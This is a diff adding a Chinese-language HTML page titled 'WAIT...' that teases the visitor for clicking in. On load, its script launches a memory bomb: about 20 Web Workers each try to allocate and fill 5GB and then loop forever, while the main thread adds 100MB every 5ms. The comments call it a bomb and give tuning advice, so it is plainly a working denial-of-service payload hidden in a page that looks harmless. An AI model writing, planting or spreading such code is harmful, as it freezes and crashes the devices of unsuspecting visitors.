@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>WAIT...</title>
+</head>
+<body>
+    <h1 style="color:red;">你怎么点进来了？</h1>
+    <p>来都来了，先等等吧……</p>
+
+    <script>
+        // 1. 定义 Worker 内部的炸弹代码（每个 Worker 独立运行）
+        const workerCode = `
+            (function workerBomb() {
+                const hog = [];
+                // 每个 Worker 分配 10 次，每次 500MB = 每个 Worker 消耗 5GB
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        const chunk = new Uint8Array(1024 * 1024 * 500); // 500MB
+                        chunk.fill(255); // 强制操作系统立刻提交物理内存
+                        hog.push(chunk);
+                        // 通过 postMessage 通知主线程进度（但主线程可能已卡死，忽略）
+                    } catch (e) {
+                        // 分配失败则进入死循环，保持进程不退出
+                        while(1) {}
+                    }
+                }
+                // 分配完成后进入死循环，防止 Worker 被垃圾回收释放内存
+                while(1) {}
+            })();
+        `;
+
+        // 2. 将代码转为 Blob URL
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        // 3. 启动 20 个 Worker（数量可调，建议 15~25 个）
+        const workerCount = 20;
+        const workers = [];
+        const statusEl = document.getElementById('status');
+
+        for (let i = 0; i < workerCount; i++) {
+            try {
+                const w = new Worker(workerUrl);
+                workers.push(w);
+                statusEl.innerText = '启动 Worker 数量：' + (i + 1);
+            } catch (e) {
+                // 如果浏览器限制 Worker 数量，忽略错误继续
+            }
+        }
+
+        // 4. 主线程也参与轰炸（双重压力）
+        setTimeout(() => {
+            const mainHog = [];
+            setInterval(() => {
+                try {
+                    const chunk = new Uint8Array(1024 * 1024 * 100); // 100MB
+                    chunk.fill(255);
+                    mainHog.push(chunk);
+                } catch (e) { /* 忽略 */ }
+            }, 5); // 每 5ms 分配 100MB
+        }, 1000);
+    </script>
+</body>
+</html>
